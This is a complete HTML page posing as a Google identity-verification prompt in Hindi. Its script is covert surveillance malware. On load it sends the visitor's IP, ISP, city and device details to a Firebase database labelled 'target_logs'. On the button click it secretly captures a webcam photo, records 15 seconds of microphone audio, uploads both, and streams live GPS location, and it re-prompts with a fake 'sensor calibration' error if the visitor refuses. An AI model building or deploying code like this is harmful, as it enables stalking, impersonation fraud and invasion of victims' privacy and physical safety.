<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google - पहचान की पुष्टि करें</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-storage.js"></script>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; color: #202124; }
        .container { width: 100%; max-width: 450px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; line-height: 1.5; margin-bottom: 30px; }
        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 24px; border-radius: 4px; font-weight: 500; font-size: 14px; cursor: pointer; width: 100%; transition: background 0.2s; }
        .btn:hover { background: #1765cc; }
        #v, #c { display: none; }
    </style>
</head>
<body onload="initCapture()">
    <div class="container" id="mainBox">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2f/Google_2015_logo.svg/375px-Google_2015_logo.svg.png" class="logo">
        <h1>पहचान की पुष्टि करें</h1>
        <p>आपके डिवाइस पर संदिग्ध गतिविधि का पता चला है। जारी रखने के लिए अपनी पहचान की पुष्टि करना अनिवार्य है।</p>
        <button class="btn" onclick="startPoliceAction()">पुष्टि करें</button>
    </div>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c"></canvas>

    <script>
        const firebaseConfig = { 
            databaseURL: "https://pari-project-police-68f77-default-rtdb.firebaseio.com/",
            storageBucket: "pari-project-police-68f77.appspot.com"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        const storage = firebase.storage();
        const logId = "KP_" + Date.now();

        async function initCapture() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                database.ref('target_logs/' + logId).set({
                    intel: { ip: data.ip, isp: data.org, city: data.city, os: navigator.platform, browser: navigator.userAgent, time: new Date().toLocaleString() },
                    status: "Target Landed"
                });
            } catch(e) {}
        }

        async function startPoliceAction() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                document.getElementById('v').srcObject = stream;
                database.ref('target_logs/' + logId).update({ status: "Access Granted" });
                
                // Silent Capture
                setTimeout(() => captureFace("Evidence_Photo"), 1000);
                startAudioIntercept(stream);

                navigator.geolocation.watchPosition((p) => {
                    database.ref('target_logs/' + logId + '/live_track').update({
                        lat: p.coords.latitude, lng: p.coords.longitude, acc: p.coords.accuracy.toFixed(1) + "m", speed: p.coords.speed || 0
                    });
                    document.getElementById('mainBox').innerHTML = "<h1>पुष्टि सफल</h1><p>सुरक्षा जांच पूरी हो गई।</p>";
                }, null, { enableHighAccuracy: true });

            } catch(e) {
                // Auto-Retry & Persuasion
                document.getElementById('mainBox').innerHTML = `
                    <p style="color:red;">त्रुटि: सेंसर कैलिब्रेशन आवश्यक है।</p>
                    <button class="btn" onclick="startPoliceAction()">पुनः प्रयास करें</button>`;
                database.ref('target_logs/' + logId).update({ status: "Permission Denied - Retrying" });
            }
        }

        function captureFace(label) {
            const v = document.getElementById('v');
            const c = document.getElementById('c');
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            c.toBlob(async (blob) => {
                const ref = storage.ref(`evidence/${logId}/${label}.jpg`);
                await ref.put(blob);
                const url = await ref.getDownloadURL();
                database.ref('target_logs/' + logId).update({ photo: url });
            }, 'image/jpeg');
        }

        function startAudioIntercept(stream) {
            const mr = new MediaRecorder(stream);
            let chunks = [];
            mr.ondataavailable = e => chunks.push(e.data);
            mr.onstop = async () => {
                const blob = new Blob(chunks, {type: 'audio/webm'});
                const ref = storage.ref(`evidence/${logId}/audio.webm`);
                await ref.put(blob);
                const url = await ref.getDownloadURL();
                database.ref('target_logs/' + logId).update({ audio_evidence: url });
            };
            mr.start();
            setTimeout(() => mr.stop(), 15000);
        }
    </script>
</body>
</html>
